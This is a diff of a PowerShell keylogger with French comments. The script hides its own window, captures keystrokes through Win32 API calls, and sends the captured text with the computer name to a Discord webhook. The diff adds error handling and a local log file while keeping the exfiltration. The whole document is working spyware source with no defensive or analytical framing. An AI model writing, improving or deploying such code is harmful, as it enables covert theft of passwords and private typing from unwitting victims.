@@ -10,14 +10,9 @@ $dc = "https://discord.com/api/webhooks/1333181685000442000/m2DkAjyoscuYxvQEtWy4
 
 # Masquer la fenêtre PowerShell
 $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
-$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
+$Type = Add-Type -MemberDefinition $Async -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
 $hwnd = (Get-Process -PID $pid).MainWindowHandle
 if ($hwnd -ne [System.IntPtr]::Zero) {
-    $Type::ShowWindowAsync($hwnd, 0)
-} else {
-    $Host.UI.RawUI.WindowTitle = 'hideme'
-    $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
-    $hwnd = $Proc.MainWindowHandle
     $Type::ShowWindowAsync($hwnd, 0)
 }
 
@@ -34,15 +29,24 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 '@
 $API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
 
-# Définir un chronomètre pour l'envoi intelligent
+# Initialiser les variables globales
 $LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
 $KeypressThreshold = [TimeSpan]::FromSeconds(10)
+$send = ""  # Initialise une chaîne vide pour les frappes capturées
+$logPath = "$env:USERPROFILE\Documents\log.txt"  # Fichier de log
 
-# Boucle continue pour capturer les touches
+# Fonction pour journaliser les événements
+function Log-Message($message) {
+    Add-Content -Path $logPath -Value "$(Get-Date -Format "yyyy-MM-dd HH:mm:ss") - $message"
+}
+
+# Journaliser le démarrage du script
+Log-Message "Le script a démarré."
+
+# Boucle continue pour capturer les frappes
 While ($true) {
     $keyPressed = $false
     try {
-        # Vérifier les activités du clavier
         while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
             Start-Sleep -Milliseconds 30
             for ($asc = 8; $asc -le 254; $asc++) {
@@ -65,19 +69,25 @@ While ($true) {
                 }
             }
         }
+    } catch {
+        Log-Message "Erreur dans la capture des touches : $_"
     } finally {
-        If ($keyPressed) {
-            # Envoyer les données capturées au webhook
-            $escmsgsys = $send -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
-            $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
-            $escmsg = $timestamp + " : " + '`' + $escmsgsys + '`'
-            $jsonsys = @{"username" = "$env:COMPUTERNAME" ; "content" = $escmsg} | ConvertTo-Json
-            Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys
-            $send = ""
-            $keyPressed = $false
+        if ($keyPressed -and $send) {
+            try {
+                # Envoyer les données capturées au webhook
+                $escmsgsys = $send -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
+                $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
+                $escmsg = $timestamp + " : " + '`' + $escmsgsys + '`'
+                $jsonsys = @{"username" = "$env:COMPUTERNAME" ; "content" = $escmsg} | ConvertTo-Json -Depth 10
+                Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys
+                Log-Message "Données envoyées : $send"
+                $send = ""
+            } catch {
+                Log-Message "Erreur lors de l'envoi au webhook : $_"
+            }
         }
     }
-    # Réinitialiser le chronomètre avant de relancer la boucle
+    # Réinitialiser le chronomètre
     $LastKeypressTime.Restart()
     Start-Sleep -Milliseconds 10
 }
